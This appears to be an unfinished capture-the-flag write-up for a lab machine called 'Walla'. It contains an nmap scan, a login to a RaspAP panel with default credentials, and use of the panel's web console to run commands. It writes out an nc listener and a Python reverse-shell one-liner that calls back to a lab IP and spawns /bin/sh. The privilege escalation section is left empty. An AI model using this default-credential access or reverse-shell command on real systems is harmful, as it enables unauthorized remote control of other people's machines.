---
description: 12/05/2022
---

# Walla

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Issuer: commonName=walla
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T18:26:36
| Not valid after:  2030-09-15T18:26:36
| MD5:   097cbda176ab9b73c8ef68ab84e9a055
|_SHA-1: 6c4bfee30bd6d9102ef9f81a3a4172d831bdbaac
|_ssl-date: TLS randomness does not represent time
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B5F9F8F2263315029AD7A81420E6CC2D
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
```

Notes:

* SSH open on 42042, 422, and 22 is open
* Telnet 23 is open -- Strange
* SMTP 25 is open
* <mark style="color:yellow;">HTTP 8091 is open -- Lighttpd 1.4.53</mark>
  * RaspAP

## Enumeration

### Port 8091 - HTTP (Lighttpd--RaspAP)

Visual:

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>admin:secret (Default Credentials)</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Discovering Default Credentials</p></figcaption></figure>

* We now have access to the RaspAP login page!

## Exploitation

* [http://192.168.66.97:8091/index.php?page=system\_info#console](http://192.168.66.97:8091/index.php?page=system\_info#console)
* Upon navigating to the following site, you can execute commands in the following window/web shell!!!

{% embed url="https://github.com/gerbsec/CVE-2020-24572-POC" %}
Not needed, but cool
{% endembed %}

Start nc Listener:

```
sudo rlwrap nc -lnvp 42042
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192
.168.49.66",42042));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>RaspAP Webshell</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>We catch a shell!</p></figcaption></figure>



## Name of the technique

This is the exploit

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
